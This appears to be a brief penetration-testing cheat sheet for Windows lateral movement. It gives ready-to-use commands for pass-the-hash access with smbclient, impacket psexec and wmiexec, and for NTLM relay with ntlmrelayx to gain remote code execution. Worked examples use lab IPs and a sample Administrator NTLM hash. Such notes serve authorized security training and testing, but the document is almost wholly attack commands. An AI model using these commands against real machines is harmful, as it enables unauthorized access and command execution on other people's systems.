#If you have a hash from a administrative privilege account or the target machine have UAC disabled:


smbclient \\\\<IP>\\<share> -U <username> --pw-nt-hash <NTLMhash>

#For example; smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b

/usr/share/doc/python3-impacket/examples/psexec.py  -hashes 00000000000000000000000000000000:<NTLMhash> <username>@<ip>

#For example; /usr/share/doc/python3-impacket/examples/psexec.py  -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.238.211

impacket-wmiexec -hashes 00000000000000000000000000000000:<NTLMHash> <username>@<ip>

######################################################################

# In some cases between two machine we can relay an autentication request to another machine that share users with the same credentials.

impacket-ntlmrelayx --no-http-server -smb2support -t <IP> -c "<COMMAND>" 

#An SMB request to our machine can be forwarded to another machine and this creedentials can be used to achieve RCE.

